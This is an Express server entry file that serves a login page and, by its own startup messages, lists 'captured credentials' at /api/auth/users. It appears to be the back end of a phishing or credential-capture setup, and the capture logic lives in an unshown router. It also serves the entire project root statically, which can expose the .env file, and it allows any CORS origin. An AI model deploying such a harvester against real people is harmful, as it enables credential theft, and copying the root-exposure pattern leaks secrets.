// Load environment variables from .env file
import 'dotenv/config';

// Import required packages
import express from 'express';
import helmet from 'helmet';  // Security middleware
import cors from 'cors';      // Cross-origin resource sharing
import { json, urlencoded } from 'express';
import { exec } from 'child_process';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import { ensureDatabaseSetup } from './src/db.js';

// Resolve the project root directory (ES modules don't have __dirname)
const __dirname = dirname(fileURLToPath(import.meta.url));
import authRouter from './src/routes/auth.js';

// Opens the users table endpoint in the default browser.
// Uses the platform-appropriate shell command to avoid adding a dependency.
function openBrowserToUsersTable(port) {
  const url = `http://localhost:${port}/api/auth/users`;
  const openCmd =
    process.platform === 'win32' ? `start "" "${url}"` :
    process.platform === 'darwin' ? `open "${url}"` :
    `xdg-open "${url}"`;
  exec(openCmd);
}

// Initialize Express application
const app = express();

// Configuration - get port from environment or use default 3001
const port = process.env.PORT || 3001;
const corsOrigin = process.env.CORS_ORIGIN || '*';

// Security middleware - adds various HTTP headers for security
app.use(helmet());

// CORS middleware - allows cross-origin requests
app.use(cors({ origin: corsOrigin }));

// Body parsing middleware - parse JSON and URL-encoded bodies
app.use(json());
app.use(urlencoded({ extended: false }));

// Health check endpoint - useful for monitoring and load balancers
app.get('/health', (req, res) => res.json({ ok: true }));

// Mount authentication routes under /api/auth prefix
app.use('/api/auth', authRouter);

// Serve frontend files (index.html, loading.html, assets) from the project root.
// This avoids file:// → http:// cross-origin fetch blocks in the browser.
app.use(express.static(__dirname));

// Initialize database and start server
ensureDatabaseSetup()
  .then(() => {
    // Database setup successful, start listening for requests
    app.listen(port, () => {
      console.log(`Server listening on http://localhost:${port}`);
      console.log(`Captured credentials → http://localhost:${port}/api/auth/users`);
      console.log(`Login page          → http://localhost:${port}/index.html`);

      openBrowserToUsersTable(port);
    });
  })
  .catch((error) => {
    // Database setup failed, log error and exit
    console.error('Failed to initialize database:', error);
    process.exit(1);
  });


